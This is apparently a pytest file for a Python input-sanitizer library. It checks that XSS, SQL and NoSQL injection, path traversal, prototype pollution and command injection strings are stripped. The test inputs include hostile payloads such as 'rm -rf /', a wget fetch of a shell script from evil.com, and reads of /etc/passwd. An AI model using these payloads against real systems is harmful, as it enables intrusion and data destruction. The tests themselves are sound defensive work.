"""
Sanitizer class tests — extracted from tests/test_core.py.
"""

import pytest
from arcis.core import Sanitizer, sanitize_string, sanitize_dict


class TestSanitizeStringXSS:
    """Test XSS prevention in sanitize_string."""

    def test_removes_script_tags(self):
        result = sanitize_string("<script>alert('xss')</script>")
        assert '<script>' not in result
        assert 'alert' not in result

    def test_removes_onerror_handler(self):
        result = sanitize_string('<img onerror="alert(1)" src="x">')
        assert 'onerror' not in result.lower()

    def test_removes_javascript_protocol(self):
        result = sanitize_string("javascript:alert(1)")
        assert 'javascript:' not in result.lower()

    def test_removes_iframe_tags(self):
        result = sanitize_string('<iframe src="evil.com">')
        assert '<iframe' not in result.lower()

    def test_encodes_html_entities(self):
        result = sanitize_string("Hello <b>World</b>")
        assert '<b>' not in result
        assert 'Hello' in result
        assert 'World' in result

    def test_removes_data_protocol(self):
        result = sanitize_string("data:text/html,<script>alert(1)</script>")
        assert '<script>' not in result


class TestSanitizeStringSQL:
    """Test SQL injection prevention in sanitize_string."""

    def test_removes_drop_table(self):
        result = sanitize_string("'; DROP TABLE users; --")
        assert 'DROP' not in result.upper()

    def test_removes_or_1_equals_1(self):
        result = sanitize_string("1 OR 1=1")
        assert 'OR 1' not in result.upper() or '1=1' not in result

    def test_removes_select(self):
        result = sanitize_string("SELECT * FROM users")
        assert 'SELECT' not in result.upper()

    def test_removes_delete(self):
        result = sanitize_string("1; DELETE FROM users")
        assert 'DELETE' not in result.upper()

    def test_removes_sql_comments(self):
        result = sanitize_string("admin'--")
        assert '--' not in result

    def test_removes_union_and_block_comments(self):
        result = sanitize_string("1 /* comment */ UNION SELECT")
        assert 'UNION' not in result.upper()


class TestSanitizeStringTimingSQL:
    """Test time-based blind SQL injection prevention."""

    def test_removes_sleep(self):
        result = sanitize_string("1 AND SLEEP(5)")
        assert "SLEEP" not in result.upper()

    def test_removes_pg_sleep(self):
        result = sanitize_string("1; SELECT pg_sleep(5)")
        assert "pg_sleep" not in result

    def test_removes_waitfor_delay(self):
        result = sanitize_string("1; WAITFOR DELAY '0:0:5'")
        assert "WAITFOR" not in result.upper()

    def test_removes_benchmark(self):
        result = sanitize_string("1 AND BENCHMARK(10000000, SHA1('test'))")
        assert "BENCHMARK" not in result.upper()


class TestSanitizeStringPathTraversal:
    """Test path traversal prevention in sanitize_string."""

    def test_removes_unix_path_traversal(self):
        result = sanitize_string("../../etc/passwd")
        assert '../' not in result

    def test_removes_windows_path_traversal(self):
        result = sanitize_string("..\\..\\windows\\system32")
        assert '..\\'not in result

    def test_removes_url_encoded_traversal(self):
        result = sanitize_string("%2e%2e%2f%2e%2e%2f")
        assert '%2e%2e' not in result.lower()

    def test_safe_input_unchanged(self):
        result = sanitize_string("file.txt")
        assert result == "file.txt"

    def test_removes_dotdotslash_bypass(self):
        result = sanitize_string("....//etc/passwd")
        assert "..//" not in result

    def test_removes_double_encoded_slash(self):
        result = sanitize_string("..%252f..%252f")
        assert "%252f" not in result.lower()

    def test_removes_double_encoded_dot(self):
        result = sanitize_string("%252e%252e/etc/passwd")
        assert "%252e" not in result.lower()


class TestSanitizeStringCommandInjection:
    """Test command injection prevention in sanitize_string."""

    def test_removes_shell_metacharacters(self):
        result = sanitize_string("hello; rm -rf /")
        assert ';' not in result

    def test_removes_pipe_operator(self):
        result = sanitize_string("input | cat /etc/passwd")
        assert '|' not in result

    def test_removes_common_commands(self):
        result = sanitize_string("wget http://evil.com/shell.sh")
        assert 'wget' not in result.lower()

    def test_removes_backticks(self):
        result = sanitize_string("`whoami`")
        assert '`' not in result

    def test_removes_shell_redirection(self):
        result = sanitize_string("echo malicious > /etc/passwd")
        assert '>' not in result

    def test_removes_node_and_powershell(self):
        result = sanitize_string("node -e 'malicious' && powershell evil")
        assert 'node' not in result.lower()
        assert 'powershell' not in result.lower()

    def test_removes_url_encoded_newline(self):
        result = sanitize_string("file.txt%0aid")
        assert "%0a" not in result.lower()

    def test_removes_url_encoded_carriage_return(self):
        result = sanitize_string("file.txt%0dwhoami")
        assert "%0d" not in result.lower()

    def test_safe_input_unchanged(self):
        from arcis.sanitizers.sanitize import Sanitizer
        sanitizer = Sanitizer(xss=False, sql=False, nosql=False, path=False, command=True)
        result = sanitizer.sanitize_string("hello world")
        assert result == "hello world"


class TestSanitizeObjectPrototypePollution:
    """Test prototype pollution prevention in sanitize_object."""

    def test_blocks_proto_key(self):
        sanitizer = Sanitizer()
        data = {"__proto__": {"admin": True}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "__proto__" not in result
        assert "name" in result

    def test_blocks_constructor_key(self):
        sanitizer = Sanitizer()
        data = {"constructor": {"prototype": {}}, "email": "test@test.com"}
        result = sanitizer.sanitize_dict(data)
        assert "constructor" not in result
        assert "email" in result

    def test_blocks_prototype_key(self):
        sanitizer = Sanitizer()
        data = {"prototype": {"isAdmin": True}, "value": 123}
        result = sanitizer.sanitize_dict(data)
        assert "prototype" not in result
        assert "value" in result

    def test_blocks_case_insensitive_proto(self):
        sanitizer = Sanitizer()
        data = {"__PROTO__": {"admin": True}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "__PROTO__" not in result
        assert "name" in result

    def test_blocks_case_insensitive_constructor(self):
        sanitizer = Sanitizer()
        data = {"Constructor": {"prototype": {}}, "email": "test@test.com"}
        result = sanitizer.sanitize_dict(data)
        assert "Constructor" not in result
        assert "email" in result

    def test_blocks_case_insensitive_prototype(self):
        sanitizer = Sanitizer()
        data = {"PROTOTYPE": {"isAdmin": True}, "value": 123}
        result = sanitizer.sanitize_dict(data)
        assert "PROTOTYPE" not in result
        assert "value" in result

    def test_blocks_mixed_case_proto(self):
        sanitizer = Sanitizer()
        data = {"__Proto__": {"polluted": True}, "safe": "value"}
        result = sanitizer.sanitize_dict(data)
        assert "__Proto__" not in result
        assert "safe" in result

    def test_blocks_defineGetter(self):
        sanitizer = Sanitizer()
        data = {"__defineGetter__": "toString", "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "__defineGetter__" not in result
        assert "name" in result

    def test_blocks_defineSetter(self):
        sanitizer = Sanitizer()
        data = {"__defineSetter__": "valueOf", "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "__defineSetter__" not in result

    def test_blocks_lookupGetter(self):
        sanitizer = Sanitizer()
        data = {"__lookupGetter__": "toString", "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "__lookupGetter__" not in result

    def test_blocks_lookupSetter(self):
        sanitizer = Sanitizer()
        data = {"__lookupSetter__": "valueOf", "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "__lookupSetter__" not in result

    def test_blocks_nested_case_insensitive(self):
        sanitizer = Sanitizer()
        data = {"user": {"__PROTO__": {"admin": True}}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "__PROTO__" not in result.get("user", {})


class TestSanitizeObjectNoSQLInjection:
    """Test NoSQL injection prevention in sanitize_object."""

    def test_blocks_gt_operator(self):
        sanitizer = Sanitizer()
        data = {"$gt": "", "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "$gt" not in result
        assert "name" in result

    def test_blocks_where_operator(self):
        sanitizer = Sanitizer()
        data = {"$where": "function(){ return true; }", "id": 1}
        result = sanitizer.sanitize_dict(data)
        assert "$where" not in result
        assert "id" in result

    def test_blocks_multiple_operators(self):
        sanitizer = Sanitizer()
        data = {"$ne": None, "$or": [], "valid": True}
        result = sanitizer.sanitize_dict(data)
        assert "$ne" not in result
        assert "$or" not in result
        assert "valid" in result

    def test_blocks_nested_regex_operator(self):
        sanitizer = Sanitizer()
        data = {"username": {"$regex": ".*"}, "password": "test"}
        result = sanitizer.sanitize_dict(data)
        if "username" in result and isinstance(result["username"], dict):
            assert "$regex" not in result["username"]
        assert "password" in result


class TestSanitizeObjectNoSQLNewOperators:
    """Test newly added NoSQL operator coverage ($jsonSchema, $nor, $function, etc.)."""

    def test_blocks_jsonschema_operator(self):
        sanitizer = Sanitizer()
        data = {"$jsonSchema": {"required": ["name"]}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "$jsonSchema" not in result

    def test_blocks_nor_operator(self):
        sanitizer = Sanitizer()
        data = {"$nor": [{"age": 5}], "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "$nor" not in result

    def test_blocks_function_operator(self):
        sanitizer = Sanitizer()
        data = {"$function": {"body": "return true;"}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "$function" not in result

    def test_blocks_accumulator_operator(self):
        sanitizer = Sanitizer()
        data = {"$accumulator": {}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "$accumulator" not in result

    def test_blocks_expr_operator(self):
        sanitizer = Sanitizer()
        data = {"$expr": {"$gt": ["$a", "$b"]}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "$expr" not in result

    def test_blocks_elemMatch_operator(self):
        sanitizer = Sanitizer()
        data = {"$elemMatch": {"score": 5}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "$elemMatch" not in result

    def test_blocks_lookup_pipeline_operator(self):
        sanitizer = Sanitizer()
        data = {"$lookup": {"from": "users"}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "$lookup" not in result

    def test_blocks_replaceRoot_operator(self):
        sanitizer = Sanitizer()
        data = {"$replaceRoot": {"newRoot": "$doc"}, "name": "test"}
        result = sanitizer.sanitize_dict(data)
        assert "$replaceRoot" not in result


class TestSanitizeObjectNested:
    """Test nested object sanitization."""

    def test_sanitizes_nested_objects(self):
        sanitizer = Sanitizer()
        data = {"user": {"name": "<script>xss</script>"}}
        result = sanitizer.sanitize_dict(data)
        assert '<script>' not in result["user"]["name"]

    def test_sanitizes_array_items(self):
        sanitizer = Sanitizer()
        data = {"items": ["<script>alert(1)</script>", "normal"]}
        result = sanitizer.sanitize_dict(data)
        assert '<script>' not in result["items"][0]
        assert result["items"][1] == "normal"


class TestSanitizerCallable:
    """Test Sanitizer as a callable."""

    def test_call_with_string(self):
        sanitizer = Sanitizer()
        result = sanitizer("<script>xss</script>")
        assert '<script>' not in result

    def test_call_with_dict(self):
        sanitizer = Sanitizer()
        result = sanitizer({"name": "<script>xss</script>", "$gt": ""})
        assert '<script>' not in result["name"]
        assert "$gt" not in result

    def test_call_with_list(self):
        sanitizer = Sanitizer()
        result = sanitizer(["<script>1</script>", "<script>2</script>"])
        assert '<script>' not in result[0]
        assert '<script>' not in result[1]
